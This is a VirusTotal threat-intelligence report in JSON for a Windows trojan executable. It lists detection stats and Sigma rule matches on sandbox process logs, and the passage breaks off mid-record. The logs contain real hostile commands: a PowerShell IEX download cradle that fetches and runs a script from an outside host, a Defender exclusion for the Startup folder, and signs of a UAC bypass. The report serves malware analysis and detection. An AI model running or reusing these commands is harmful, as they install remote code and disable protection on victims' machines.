{
    "data":  {
                 "id":  "dab30b7895ab22c54ae495b1e99d858f2b2132bf849b4f4d0ea9a7832539ed78",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/dab30b7895ab22c54ae495b1e99d858f2b2132bf849b4f4d0ea9a7832539ed78"
                           },
                 "attributes":  {
                                    "last_analysis_stats":  {
                                                                "malicious":  55,
                                                                "suspicious":  0,
                                                                "undetected":  17,
                                                                "harmless":  0,
                                                                "timeout":  0,
                                                                "confirmed-timeout":  0,
                                                                "failure":  0,
                                                                "type-unsupported":  4
                                                            },
                                    "unique_sources":  3,
                                    "type_tags":  [
                                                      "executable",
                                                      "windows",
                                                      "win32",
                                                      "pe",
                                                      "peexe"
                                                  ],
                                    "threat_severity":  {
                                                            "threat_severity_level":  "SEVERITY_HIGH",
                                                            "threat_severity_data":  {
                                                                                         "belongs_to_bad_collection":  true,
                                                                                         "num_gav_detections":  2,
                                                                                         "popular_threat_category":  "trojan",
                                                                                         "has_references":  true
                                                                                     },
                                                            "last_analysis_date":  "1706341430",
                                                            "version":  5,
                                                            "level_description":  "Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes."
                                                        },
                                    "times_submitted":  3,
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B604-6419-0406-000000004700}; ProcessId=2736; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B603-6419-0206-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\Desktop\\executable.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5200; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\Desktop\\executable.exe\"; UtcTime=1679406596; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B604-6419-0606-000000004700}; ProcessId=7148; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B604-6419-0406-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2736; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=powershell  -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027); EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)\"; UtcTime=1679406596; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=powershell  -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027); Image=powershell}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "critical",
                                                                       "rule_id":  "317ff64a1d49452191210f7b55d7201e483352440ec851a9c716f6be7cfb7ec9",
                                                                       "rule_source":  "Joe Security Rule Set (GitHub)",
                                                                       "rule_title":  "Powershell Download and Execute IEX",
                                                                       "rule_description":  "powershell download file from internet and execute",
                                                                       "rule_author":  "Joe Security"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B60A-6419-0D06-000000004700}; ProcessId=7128; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B609-6419-0C06-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3300; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406602; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B60A-6419-0F06-000000004700}; ProcessId=6568; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B60A-6419-0D06-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7128; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=powershell  -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; UtcTime=1679406602; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B617-6419-1806-000000004700}; ProcessId=4700; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B617-6419-1706-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6844; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406615; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B618-6419-1A06-000000004700}; ProcessId=1744; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B617-6419-1806-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4700; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=powershell  -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; UtcTime=1679406616; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "critical",
                                                                       "rule_id":  "d933fed60e38128e7e3586361ae42b885a5285e04ab14da997282550a77a9059",
                                                                       "rule_source":  "Joe Security Rule Set (GitHub)",
                                                                       "rule_title":  "Powershell adding suspicious path to exclusion list",
                                                                       "rule_description":  "Powershell adding suspicious path to exclusion list",
                                                                       "rule_author":  "Joe Security"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B60A-6419-0D06-000000004700}; ProcessId=7128; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B609-6419-0C06-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3300; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406602; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B617-6419-1806-000000004700}; ProcessId=4700; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B617-6419-1706-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6844; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406615; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "2219766fcc5e77936dbd9b7310a20b2ba3f5b4aac858c6ac312c81fcc2838d4a",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "UAC Bypass via ICMLuaUtil",
                                                                       "rule_description":  "Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B60A-6419-0D06-000000004700}; ProcessId=7128; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B609-6419-0C06-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3300; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406602; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B617-6419-1806-000000004700}; ProcessId=4700; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B617-6419-1706-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6844; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406615; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "a30845acd045e920f165087e59ac6d9461f6c4bfadfa52e4c518e3bcb9d8cb0c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "CMSTP UAC Bypass via COM Object Access",
                                                                       "rule_description":  "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)",
                                                                       "rule_author":  "Nik Seetharaman, Christian Burkard (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B604-6419-0406-000000004700}; ProcessId=2736; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B603-6419-0206-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\Desktop\\executable.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5200; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\Desktop\\executable.exe\"; UtcTime=1679406596; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B604-6419-0606-000000004700}; ProcessId=7148; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B604-6419-0406-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2736; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=powershell  -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027); EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)\"; UtcTime=1679406596; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=1; Image=powershell; CommandLine=powershell  -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "bdb4652f83b1c4482478b0c14bcb08d332fcd600a7303ab1c709c543499be726",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Download and Execute Pattern",
                                                                       "rule_description":  "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B604-6419-0406-000000004700}; ProcessId=2736; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B603-6419-0206-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\Desktop\\executable.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5200; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\Desktop\\executable.exe\"; UtcTime=1679406596; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B604-6419-0606-000000004700}; ProcessId=7148; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B604-6419-0406-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2736; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=powershell  -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027); EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)\"; UtcTime=1679406596; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e88280a32f81c8575c3cb9b02910d867498fbf28ca75ca922ad991faa3a68879",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Web Download and Execution",
                                                                       "rule_description":  "Detects suspicious ways to download files or content and execute them using PowerShell Invoke-Expression",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=powershell  -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027); Image=powershell}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e88280a32f81c8575c3cb9b02910d867498fbf28ca75ca922ad991faa3a68879",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Download and Execution Cradles",
                                                                       "rule_description":  "Detects PowerShell download and execution cradles.",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B60A-6419-0D06-000000004700}; ProcessId=7128; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B609-6419-0C06-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3300; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406602; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B617-6419-1806-000000004700}; ProcessId=4700; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B617-6419-1706-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6844; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406615; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "16502dbca7468597f52d37ca5a5a0f5c904c43f0ca2b6726d890a67a63b68516",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Unusual Parent Process For Cmd.EXE",
                                                                       "rule_description":  "Detects suspicious parent process for cmd.exe",
                                                                       "rule_author":  "Tim Rauch"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B60A-6419-0D06-000000004700}; ProcessId=7128; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B609-6419-0C06-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3300; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406602; RuleName=-}"
                                                                                             },
                                                                                             {
